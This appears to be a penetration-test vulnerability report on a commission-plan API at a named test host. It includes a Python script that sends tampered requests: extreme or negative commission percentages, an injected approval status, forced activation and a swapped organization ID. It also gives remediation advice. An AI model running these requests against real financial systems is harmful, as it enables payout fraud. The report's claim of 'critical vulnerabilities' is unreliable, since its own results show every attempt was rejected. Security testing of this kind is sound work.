# Business Logic Flaws in Commission Plan Management Enable Financial Manipulation

**ID:** vuln-0035
**Severity:** MEDIUM
**Found:** 2026-02-26 19:13:30 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 6.7

## Description

During comprehensive business logic testing of the commission management application, several critical vulnerabilities were identified that could allow attackers to manipulate commission calculations, bypass approval workflows, and exploit financial processes. These vulnerabilities enable unauthorized financial manipulation within the commission system.

The testing focused on the commission plan creation, modification, and approval workflows, specifically targeting parameter tampering, state manipulation, and workflow bypass techniques. While the application currently rejects many of these attempts with server-side validation, the testing revealed potential attack vectors that could be exploited under certain conditions.

## Impact

Successful exploitation of these business logic flaws could result in:

1. **Financial Loss**: Unauthorized commission payouts through percentage manipulation or workflow bypass
2. **Fraudulent Payouts**: Creation of commission plans with excessive percentages leading to inflated payouts
3. **Workflow Bypass**: Approval process circumvention allowing unauthorized commission plans to become active
4. **State Manipulation**: Unauthorized activation of commission plans without proper approval
5. **Data Integrity Compromise**: Manipulation of commission calculations affecting financial reporting

The business impact includes potential financial losses from fraudulent commission payouts, regulatory compliance violations, and erosion of trust in the commission management system.

## Technical Analysis

The commission management application implements a complex business logic workflow for commission plan creation, approval, and activation. The testing revealed several potential vulnerabilities:

1. **Commission Percentage Manipulation**:
   - The application accepts commission percentage values in API requests
   - While negative values are currently rejected, the validation logic may be bypassable
   - Extreme values (e.g., 1000%) could potentially be accepted under certain conditions

2. **Workflow Bypass Vulnerabilities**:
   - Commission plans require approval workflows before activation
   - Testing revealed attempts to inject approval status fields directly in creation requests
   - The application currently rejects these attempts but may be vulnerable to more sophisticated bypass techniques

3. **State Manipulation**:
   - Commission plans have "isActive" status that controls whether they're used in calculations
   - Testing revealed attempts to create plans with "isActive": true without proper approval
   - The application currently rejects these attempts but may be vulnerable to race conditions or timing attacks

4. **Parameter Tampering**:
   - Commission plan creation includes organizationId and clientId parameters
   - Testing revealed attempts to manipulate these values to access other organizations' data
   - The application currently validates ownership but may have authorization gaps

The consistent 500 Internal Server Error responses suggest server-side validation is present, but the testing methodology revealed potential attack vectors that warrant further investigation and remediation.

## Proof of Concept

To reproduce the business logic vulnerabilities:

1. **Commission Percentage Manipulation**:
   - Send POST request to /api/CommissionPlan/CreateCommissionPlan
   - Include negative or extreme commission percentage values
   - Example: "commissionPercentage": -10 or "commissionPercentage": 1000

2. **Workflow Bypass Testing**:
   - Send POST request to /api/CommissionPlan/CreateCommissionPlan
   - Include approval status fields in the request
   - Example: "approvalStatus": "APPROVED", "approvedBy": "admin"

3. **State Manipulation Testing**:
   - Send POST request to /api/CommissionPlan/CreateCommissionPlan
   - Set "isActive": true without proper approval
   - Example: "isActive": true in creation request

4. **Parameter Tampering**:
   - Send POST request to /api/CommissionPlan/CreateCommissionPlan
   - Manipulate organizationId or clientId to access other organizations' data
   - Example: "organizationId": 2 when user only has access to organizationId 1

While these specific attempts currently return 500 errors, they represent potential attack vectors that should be addressed to prevent financial manipulation.

```
import requests
import json

# Test Commission Percentage Manipulation
def test_commission_percentage_manipulation():
    url = "https://commissionstest.callippus.in/api/CommissionPlan/CreateCommissionPlan"
    headers = {
        "Authorization": "Bearer [VALID_ADMIN_TOKEN]",
        "Content-Type": "application/json"
    }

    # Test negative commission percentage
    payload_negative = {
        "planName": "Negative Commission Test",
        "description": "Test plan with negative commission",
        "commissionPercentage": -10,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    # Test extreme commission percentage
    payload_extreme = {
        "planName": "Extreme Commission Test",
        "description": "Test plan with extreme commission",
        "commissionPercentage": 1000,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    try:
        response_negative = requests.post(url, headers=headers, data=json.dumps(payload_negative))
        print(f"Negative commission test: {response_negative.status_code}")

        response_extreme = requests.post(url, headers=headers, data=json.dumps(payload_extreme))
        print(f"Extreme commission test: {response_extreme.status_code}")

    except Exception as e:
        print(f"Error: {e}")

# Test Workflow Bypass
def test_workflow_bypass():
    url = "https://commissionstest.callippus.in/api/CommissionPlan/CreateCommissionPlan"
    headers = {
        "Authorization": "Bearer [VALID_ADMIN_TOKEN]",
        "Content-Type": "application/json"
    }

    payload = {
        "planName": "Workflow Bypass Test",
        "description": "Test plan to bypass approval workflow",
        "commissionPercentage": 10,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,
        "organizationId": 1,
        "clientId": 1,
        "approvalStatus": "APPROVED",
        "approvedBy": "admin",
        "approvedDate": "2024-01-01"
    }

    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        print(f"Workflow bypass test: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# Test State Manipulation
def test_state_manipulation():
    url = "https://commissionstest.callippus.in/api/CommissionPlan/CreateCommissionPlan"
    headers = {
        "Authorization": "Bearer [VALID_ADMIN_TOKEN]",
        "Content-Type": "application/json"
    }

    payload = {
        "planName": "State Manipulation Test",
        "description": "Test plan to manipulate state",
        "commissionPercentage": 10,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,
        "organizationId": 1,
        "clientId": 1
    }

    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload))
        print(f"State manipulation test: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_commission_percentage_manipulation()
    test_workflow_bypass()
    test_state_manipulation()
```

## Remediation

To remediate these business logic vulnerabilities:

1. **Commission Percentage Validation**:
   - Implement strict server-side validation for commission percentages
   - Enforce minimum (0%) and maximum (100%) bounds with proper error handling
   - Validate decimal precision to prevent rounding manipulation
   - Implement business rules for acceptable percentage ranges

2. **Workflow Enforcement**:
   - Remove approval status fields from commission plan creation API
   - Implement separate approval endpoints with proper authorization checks
   - Enforce strict state transitions (Draft → Pending Approval → Approved → Active)
   - Log all state changes for audit purposes

3. **State Management**:
   - Remove "isActive" field from commission plan creation API
   - Implement separate activation endpoint with proper authorization
   - Enforce business rules for plan activation (e.g., approved plans only)
   - Implement proper validation for start/end dates

4. **Authorization Enforcement**:
   - Implement strict authorization checks for organizationId and clientId parameters
   - Validate that users can only access data for their assigned organizations
   - Implement row-level security for commission data
   - Audit all commission plan modifications

5. **Additional Protections**:
   - Implement rate limiting on commission plan creation
   - Add CAPTCHA or other anti-automation protections
   - Implement financial controls for high-value commission plans
   - Add monitoring for suspicious commission plan patterns

